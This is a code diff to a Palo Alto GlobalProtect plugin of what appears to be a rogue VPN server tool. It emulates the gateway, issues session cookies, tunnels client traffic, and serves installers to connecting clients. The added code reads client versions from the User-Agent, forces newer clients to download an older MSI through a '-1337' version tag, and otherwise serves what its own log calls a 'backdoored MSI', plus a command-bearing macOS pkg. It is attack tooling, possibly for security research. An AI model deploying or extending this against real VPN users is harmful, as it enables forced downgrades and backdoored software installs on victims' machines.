@@ -3,11 +3,11 @@ from flask import Response, abort, request, redirect
 from nachovpn.plugins.paloalto.pkg_generator import generate_pkg
 from nachovpn.plugins.paloalto.msi_patcher import get_msi_patcher, random_hash, ACTION_TYPE_SHELL, ACTION_TYPE_CONTINUE, \
     ACTION_TYPE_ASYNC, ACTION_TYPE_COMMIT, ACTION_TYPE_IN_SCRIPT, ACTION_TYPE_NO_IMPERSONATE
+from urllib.parse import urlparse, parse_qs
 
-import logging
-import traceback
 import subprocess
 import shutil
+import uuid
 import ssl
 import os
 import io
@@ -47,13 +47,15 @@ class PaloAltoPlugin(VPNPlugin):
         self.codesign_key_path = os.path.join('certs', 'paloalto-codesign.key')
         self.codesign_pfx_path = os.path.join('certs', 'paloalto-codesign.pfx')
 
+        # Get versions
+        self.latest_version = self.get_latest_msi_version()
+        self.upgrade_version = self.get_higher_version(self.latest_version)
+
         # Gateway config
         self.gateway_config = {
             "gateway_ip": self.external_ip,
             "ca_certificate": "",
             "dns_name": self.dns_name,
-            "version": "6.3.2-376",
-            "should_downgrade": False
         }
 
         # Run bootstrap
@@ -63,7 +65,7 @@ class PaloAltoPlugin(VPNPlugin):
 
     def generate_pkg(self):
         pkg_buf = generate_pkg(
-            self.gateway_config["version"].replace('-', 'f'),
+            self.upgrade_version.replace('-', 'f'),
             self.pkg_command,
             "GlobalProtect",
             self.apple_cert_path,
@@ -240,12 +242,6 @@ class PaloAltoPlugin(VPNPlugin):
         if not latest_version:
             return False
 
-        # Set version in gateway config
-        if self.msi_increment_version:
-            bump = self.get_higher_version(latest_version)
-            self.logger.info(f"Bumping version from {latest_version} to {bump}")
-            self.gateway_config["version"] = bump
-
         # Check for .old MSI files
         for msi_file in ["GlobalProtect.msi", "GlobalProtect64.msi"]:
             old_file = os.path.join(self.download_dir, f"{msi_file}.old")
@@ -268,19 +264,38 @@ class PaloAltoPlugin(VPNPlugin):
 
     def can_handle_http(self, handler):
         user_agent = handler.headers.get('User-Agent', '')
-        self.logger.info(f"User-Agent: {user_agent}")
         if 'GlobalProtect' in user_agent or \
            handler.path.startswith('/ssl-tunnel-connect.sslvpn'):
             return True
         return False
 
+    def generate_auth_cookie(self, connection_id):
+        return uuid.UUID(connection_id).bytes.hex()
+
+    def decode_auth_cookie(self, auth_cookie):
+        return str(uuid.UUID(bytes=bytes.fromhex(auth_cookie)))
+
+    def extract_auth_cookie(self, handler):
+        query = urlparse(handler.path).query
+        params = parse_qs(query)
+        return params.get('authcookie', [None])[0]
+
     def handle_http(self, handler):
         if handler.command == 'GET' and handler.path.startswith('/ssl-tunnel-connect.sslvpn'):
-            # Start the tunnel
-            self.logger.info('Starting tunnel')
+            auth_cookie = self.extract_auth_cookie(handler)
+            connection_id = self.decode_auth_cookie(auth_cookie)
+            if not connection_id:
+                self.logger.error(f"Unknown connection_id: {connection_id}")
+                return False
+
+            # Assign the socket to the connection_id
+            self.packet_handler.assign_socket(connection_id, handler.connection)
+
+            self.logger.info(f"Starting tunnel for {connection_id}")
             handler.connection.sendall(b'START_TUNNEL')
+
             # Pass handling to data handler
-            return self.handle_data(b'', handler.connection, handler.client_address[0])
+            return self.handle_data(b'', handler.connection, handler.client_address[0], connection_id)
         elif handler.command == 'GET':
             return self.handle_get(handler)
         elif handler.command == 'POST':
@@ -293,13 +308,11 @@ class PaloAltoPlugin(VPNPlugin):
 
         @self.flask_app.route('/global-protect/prelogin.esp', methods=['GET', 'POST'])
         def global_protect_pre_login():
-            self.check_client_version(request.headers.get('User-Agent', ''))
             xml = self.render_template('prelogin.xml')
             return Response(xml, mimetype='application/xml')
 
         @self.flask_app.route('/ssl-vpn/prelogin.esp', methods=['GET', 'POST'])
         def ssl_vpn_pre_login():
-            self.check_client_version(request.headers.get('User-Agent', ''))
             xml = self.render_template('sslvpn-prelogin.xml')
             return Response(xml, mimetype='application/xml')
 
@@ -321,8 +334,11 @@ class PaloAltoPlugin(VPNPlugin):
                         info
                     )
 
-            self.check_client_version(request.headers.get('User-Agent', ''))
-            xml = self.render_template('sslvpn-login.xml')
+            connection_id, ip_address = self.packet_handler.create_session(None, self._wrap_packet)
+            client_config = self.gateway_config.copy()
+            client_config["client_ip"] = ip_address
+            client_config["auth_cookie"] = self.generate_auth_cookie(connection_id)
+            xml = self.render_template('sslvpn-login.xml', **client_config)
             return Response(xml, mimetype='application/xml')
 
         @self.flask_app.route('/global-protect/getconfig.esp', methods=['GET', 'POST'])
@@ -343,11 +359,18 @@ class PaloAltoPlugin(VPNPlugin):
                         info
                     )
 
-            self.check_client_version(request.headers.get('User-Agent', ''))
-            xml = self.render_template('pwresponse.xml', **self.gateway_config)
+            # check if we need to downgrade
+            if self.should_downgrade(request.headers.get('User-Agent', '')):
+                version = self.upgrade_version + "-1337"
+            else:
+                version = self.upgrade_version
+
+            config = self.gateway_config.copy()
+            config["version"] = version
+            xml = self.render_template('pwresponse.xml', **config)
             return Response(xml, mimetype='application/xml')
 
-        @self.flask_app.route('/ssl-vpn/getconfig.esp', methods=['GET', 'POST'])
+        @self.flask_app.route('/ssl-vpn/getconfig.esp', methods=['POST'])
         def ssl_vpn_get_config():
             if request.method == "POST":
                 username = request.form.get('user')
@@ -365,28 +388,40 @@ class PaloAltoPlugin(VPNPlugin):
                         info
                     )
 
-            self.check_client_version(request.headers.get('User-Agent', ''))
-            xml = self.render_template('getconfig.xml', **self.gateway_config)
+            # Fill in the assigned IP address
+            auth_cookie = request.form.get('authcookie')
+            connection_id = self.decode_auth_cookie(auth_cookie)
+            if not connection_id:
+                self.logger.error(f"Unknown connection_id: {connection_id}")
+                return abort(404)
+
+            client_ip = self.packet_handler.get_assigned_ip(connection_id)
+            self.logger.info(f"Client IP: {client_ip}")
+            client_config = self.gateway_config.copy()
+            client_config["client_ip"] = client_ip
+            xml = self.render_template('getconfig.xml', **client_config)
             return Response(xml, mimetype='application/xml')
 
         @self.flask_app.route('/global-protect/getmsi.esp', methods=['GET', 'POST'])
         def get_msi_redirect():
             user_agent = request.headers.get('User-Agent')
+            version = request.args.get('v')
             if 'apple mac' in user_agent.lower() or 'darwin' in user_agent.lower():
                 return redirect(f"/msi/GlobalProtect.pkg", code=302)
             elif request.args.get('version') == '64':
-                return redirect(f"/msi/GlobalProtect64.msi", code=302)
-            return redirect(f"/msi/GlobalProtect.msi", code=302)
+                return redirect(f"/msi/GlobalProtect64.msi?v={version}", code=302)
+            return redirect(f"/msi/GlobalProtect.msi?v={version}", code=302)
 
         @self.flask_app.route('/msi/<file_name>', methods=['GET'])
         def download_msi(file_name):
             if file_name not in ['GlobalProtect.pkg', 'GlobalProtect.msi', 'GlobalProtect64.msi']:
                 return abort(404)
 
-            # Use the downgrade flag to determine which version to serve
-            if self.gateway_config["should_downgrade"]:
+            if request.args.get('v', '').endswith('-1337'):
+                self.logger.info("Serving downgrade MSI")
                 file_path = os.path.join(self.download_dir, f"{file_name}.old")
             else:
+                self.logger.info("Serving backdoored MSI")
                 file_path = os.path.join(self.payload_dir, file_name)
 
             if not os.path.exists(file_path):
@@ -408,7 +443,55 @@ class PaloAltoPlugin(VPNPlugin):
 
             return Response(file_content, headers=headers)
 
-    def process_tcp_message(self, client_socket, data, client_ip):
+    def _wrap_packet(self, packet_data, client):
+        # Determine EtherType
+        if len(packet_data) > 0:
+            if (packet_data[0] >> 4) == 4:
+                ether_type = 0x0800  # IPv4
+            elif (packet_data[0] >> 4) == 6:
+                ether_type = 0x86dd  # IPv6
+            else:
+                self.logger.error(f"Unknown EtherType: {packet_data[0] >> 4}")
+                return None
+        else:
+            self.logger.error(f"Empty packet data")
+            return None
+
+        packet_length = len(packet_data)
+        packet = (
+            SSL_VPN_MAGIC +
+            ether_type.to_bytes(2, 'big') +
+            packet_length.to_bytes(2, 'big') +
+            SSL_VPN_STATIC +
+            packet_data
+        )
+        return packet
+
+    def handle_data(self, data, client_socket, client_ip, connection_id=None):
+        try:
+            client_socket.setblocking(True)
+            data = b''
+            while True:
+                try:
+                    chunk = client_socket.recv(4096)
+                    if not chunk:
+                        break
+                    data += chunk
+                    self.process_tcp_message(client_socket, data, client_ip, connection_id)
+                    data = b''
+                except BlockingIOError:
+                    continue
+                except ssl.SSLWantReadError:
+                    continue
+        except Exception as e:
+            self.logger.error(f'Error handling connection: {type(e)}: {e}')
+        finally:
+            self.packet_handler.destroy_session(connection_id)
+            client_socket.close()
+            return True
+        return False
+
+    def process_tcp_message(self, client_socket, data, client_ip, connection_id):
         # Process the TCP message data as needed
         if data == KEEP_ALIVE_PACKET:
             self.logger.debug(f"Received KEEP_ALIVE Packet from {client_ip}")
@@ -439,52 +522,24 @@ class PaloAltoPlugin(VPNPlugin):
             self.logger.warning(f"UNKNOWN Packet Type: {ether_type}")
             return
 
-        self.packet_handler.handle_client_packet(packet_data)
+        self.packet_handler.handle_client_packet(
+            packet_data,
+            connection_id
+            )
 
-    def handle_data(self, data, client_socket, client_ip):
-        try:
-            client_socket.setblocking(False)
-
-            data = b''
-            while True:
-                try:
-                    chunk = client_socket.recv(4096)
-                    if not chunk:
-                        break
-
-                    data += chunk
-
-                    # Process TCP messages
-                    self.process_tcp_message(client_socket, data, client_ip)
-                    data = b''
-                except BlockingIOError:
-                    # No data available, continue
-                    continue    
-                except ssl.SSLWantReadError:
-                    continue
-
-        except Exception as e:
-            self.logger.error(f'Error handling connection: {type(e)}: {e}')
-        finally:
-            client_socket.close()
-            return True
-        return False
-
-    def check_client_version(self, user_agent):
+    def should_downgrade(self, user_agent):
         # Check if there's a client version in the user agent
-        # If so, set the should_downgrade flag based on the version
         version_match = re.search(r'GlobalProtect/(\d+\.\d+\.\d+)', user_agent)
         if version_match:
             client_version = version_match.group(1)
             self.logger.debug(f"Client version: {client_version}")
 
-            # Compare versions
+            # If it's higher than 6.2.6, downgrade
             major, minor, patch = map(int, client_version.split('.')[:3])
             if (major > 6) or (major == 6 and minor > 2) or (major == 6 and minor == 2 and int(patch) > 6):
                 self.logger.debug(f"Client version {client_version} needs downgrade")
-                self.gateway_config["should_downgrade"] = True
+                return True
             else:
                 self.logger.debug(f"Client version {client_version} is compatible")
-                self.gateway_config["should_downgrade"] = False
-            return client_version
-        return None
+                return False
+        return False
